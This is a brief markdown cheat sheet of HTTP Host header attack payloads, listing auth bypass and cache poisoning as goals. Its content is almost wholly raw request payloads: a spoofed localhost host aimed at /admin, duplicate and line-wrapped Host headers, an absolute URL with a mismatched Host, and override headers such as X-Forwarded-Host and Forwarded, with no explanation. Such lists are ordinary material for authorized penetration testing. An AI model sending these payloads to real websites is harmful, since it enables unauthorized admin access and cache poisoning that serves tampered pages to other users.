# Host Header

- Bypass Auth
- Cache Poisoning

### Payloads

    GET /example HTTP/1.1
    Host: localost # get /admin
    
    GET /example HTTP/1.1
    Host: AAAA.vulnerable-website.com
    
    GET /example HTTP/1.1
    Host: legit.com
    Host: AAAA.com # test with .com and w/o
    
    GET /example HTTP/1.1
    Host: legit.com
     Host: AAAA.com
     
    GET https://legit.com/ HTTP/1.1
    Host: AAAA

    GET /example HTTP/1.1
    Host: legit.com
    X-Forwarded-Host: AAAA
    X-Host: AAAA
    X-Forwarded-Server: AAAA
    X-HTTP-Host-Override: AAAA
    Forwarded: AAAA
